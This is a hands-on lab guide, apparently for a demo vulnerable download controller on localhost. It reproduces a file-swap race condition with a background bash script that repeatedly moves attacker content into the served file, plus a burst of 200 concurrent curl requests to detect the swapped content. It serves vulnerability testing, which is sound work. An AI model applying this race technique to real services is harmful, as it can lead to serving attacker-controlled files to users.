## 1) Create the storage and test files 

```bash
STORAGE="/tmp/secure-downloads-demo"
rm -rf "$STORAGE"                # remove any broken state from previous attempts
mkdir -p "$STORAGE"
# create safe / attack files and the deployed file
echo "NORMAL_CONTENT" > "$STORAGE/target-real"
echo "ATTACKER_CONTENT" > "$STORAGE/target-attack"
cp "$STORAGE/target-real" "$STORAGE/target.txt"
# show them
ls -la "$STORAGE"
```

You should see `target-real`, `target-attack` and `target.txt` listed.

---

## 2) Robust swapper script that *recreates* missing attack file automatically

This swapper will atomically replace `target.txt` with attacker content (via `mv`), and if `target-attack` is ever missing it will recreate it so `mv` never fails.

Save and run it:

```bash
cat > /tmp/swap_contents.sh <<'BASH'
#!/usr/bin/env bash
set -euo pipefail

STORAGE="/tmp/secure-downloads-demo"
TARGET="$STORAGE/target.txt"
REAL="$STORAGE/target-real"
ATTACK="$STORAGE/target-attack"
TMP_ATTACK="$STORAGE/._attack_tmp"

# ensure attack file exists at start
if [ ! -f "$ATTACK" ]; then
  echo "ATTACKER_CONTENT" > "$ATTACK"
fi

while true; do
  # ensure attacker file exists (recreate if needed)
  if [ ! -f "$ATTACK" ]; then
    echo "recreating missing attack file"
    echo "ATTACKER_CONTENT" > "$ATTACK"
  fi

  # atomically move attack into place (mv across same FS is atomic)
  mv -f "$ATTACK" "$TARGET"

  # small window
  sleep 0.02

  # restore normal content (atomic replace)
  cp -f "$REAL" "$TARGET"

  # tiny pause to yield CPU
  sleep 0.02
done
BASH

chmod +x /tmp/swap_contents.sh
```

Start it in the background (and capture logs):

```bash
nohup bash /tmp/swap_contents.sh > /tmp/swapper.log 2>&1 &
echo "swapper started, PID: $!"
sleep 0.2
tail -n 20 /tmp/swapper.log || true
```

---

## 3) Verify the storage contents while swapper runs

(You should see `target.txt` toggling between contents if you `cat` repeatedly.)

```bash
# show file metadata and a quick peek
ls -la /tmp/secure-downloads-demo
head -n 5 /tmp/secure-downloads-demo/target.txt || true
```

---

## 4) Run the concurrent download tester (increase attempts if needed)

Run this in another terminal (or same — it's fine). It fires many concurrent requests and then searches results for `ATTACKER_CONTENT`.

```bash
# spawn many concurrent downloads
for i in $(seq 1 200); do
  curl -s "http://localhost:5007/api/files/download/target.txt" -o "/tmp/result_$i.txt" &
done
wait

# check if any response contained the attacker content
if grep -q "ATTACKER_CONTENT" /tmp/result_*.txt 2>/dev/null; then
  echo "=== RACE REPRODUCED: attack content observed in at least one response ==="
  grep -H "ATTACKER_CONTENT" /tmp/result_*.txt | sed -n '1,20p'
else
  echo "No attacker content found. Try increasing concurrency or the controller delay (demo-only)."
fi
```

If you see `RACE REPRODUCED`, the vulnerable controller sometimes served the swapped-in attacker content.

---

## 5) Cleanup when done

```bash
# stop swapper
pkill -f swap_contents.sh || true
# remove test outputs
rm -f /tmp/result_*.txt /tmp/swapper.log /tmp/swap_contents.sh || true
# restore safe file
cp -f /tmp/secure-downloads-demo/target-real /tmp/secure-downloads-demo/target.txt
ls -la /tmp/secure-downloads-demo
```

